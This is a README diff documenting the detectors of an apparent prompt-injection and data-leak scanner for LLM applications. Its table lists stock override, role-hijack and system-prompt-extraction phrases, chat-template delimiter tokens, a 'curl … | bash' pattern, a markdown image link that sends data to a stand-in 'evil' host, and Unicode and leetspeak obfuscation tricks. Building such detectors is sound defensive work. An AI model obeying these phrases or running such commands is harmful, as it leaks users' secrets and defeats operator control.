@@ -36,3 +36,25 @@ if outgoing.blocked:  # leaked the canary, a key, an Aadhaar number...
 Every scan returns a `ScanResult` with `verdict` (`allow`, `review` or `block`),
 a `score` from 0 to 100 and the list of `findings`.
 
+## Detectors
+
+| Detector | Scans | Catches |
+| --- | --- | --- |
+| `instruction_override` | input | "ignore all previous instructions", "new rules:", "from now on…" |
+| `role_hijack` | input | "act as an unrestricted AI", "pretend you have no rules" |
+| `system_prompt_extraction` | input | "reveal your system prompt", "repeat everything above verbatim" |
+| `delimiter_injection` | input | `<\|im_start\|>`, `[INST]`, `<<SYS>>`, fake `SYSTEM:` headers |
+| `jailbreak_persona` | input | DAN / "do anything now", "developer mode enabled" |
+| `tool_abuse` | input | "call the tool without asking", "send the API keys to…", `curl … \| bash` |
+| `encoded_payload` | input | base64 / hex blobs that decode to any of the above |
+| `invisible_text` | both | Unicode tag-character smuggling (decoded for you), bidi overrides, zero-width runs |
+| `markdown_exfil` | both | `![x](https://evil/?d=<data>)` images and links that ship data off-site |
+| `canary_leak` | output | your system-prompt canary, even if spaced out or re-cased |
+| `secret_leak` | output | AWS, GitHub, OpenAI, Anthropic, Google, Slack, Stripe keys, private keys, JWTs |
+| `pii_leak` | output | Aadhaar (Verhoeff-checked), PAN, Indian mobile numbers, cards (Luhn-checked), email |
+
+Before matching, input is normalized: full-width letters, Cyrillic/Greek
+look-alikes, zero-width characters, odd spacing and leetspeak (`1gn0re`) are
+folded so obfuscated attacks still match. Evidence for secrets and PII is
+redacted so reports never re-leak what they found.
+
